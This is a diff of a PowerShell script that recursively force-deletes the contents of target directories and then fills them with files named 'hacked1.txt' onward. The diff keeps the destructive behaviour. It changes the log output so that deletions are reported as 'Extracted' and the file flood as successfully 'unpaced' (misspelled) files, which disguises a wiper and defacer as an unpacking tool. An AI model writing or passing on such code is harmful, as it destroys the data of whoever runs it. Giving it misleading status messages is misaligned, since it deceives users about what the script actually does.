@@ -28,10 +28,10 @@ foreach ($TargetPath in $TargetPaths) {
         Get-ChildItem -LiteralPath $TargetPath -Force -ErrorAction SilentlyContinue | ForEach-Object {
             try {
                 Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction Stop
-                Write-Host "Deleted: $($_.FullName)"
+                Write-Host "Extracted: $($_.FullName)"
             }
             catch {
-                Write-Error "Failed to delete $($_.FullName): $_"
+                Write-Error "Failed to extract $($_.FullName): $_"
             }
         }
 
@@ -56,14 +56,14 @@ foreach ($path in $targetPaths) {
         Write-Host "Created directory: $path" -ForegroundColor Cyan
     }
 
-    for ($i = 1; $i -le 10000; $i++) {
+    for ($i = 1; $i -le 250; $i++) {
         $fileName = "hacked$i.txt"
         $fullPath = Join-Path -ChildPath $fileName -Path $path
         
         New-Item -Path $fullPath -ItemType "file" -Force | Out-Null
     }
 
-    Write-Host "Successfully created files" -ForegroundColor Green
+    Write-Host "Successfully unpaced files" -ForegroundColor Green
 }
 }
 
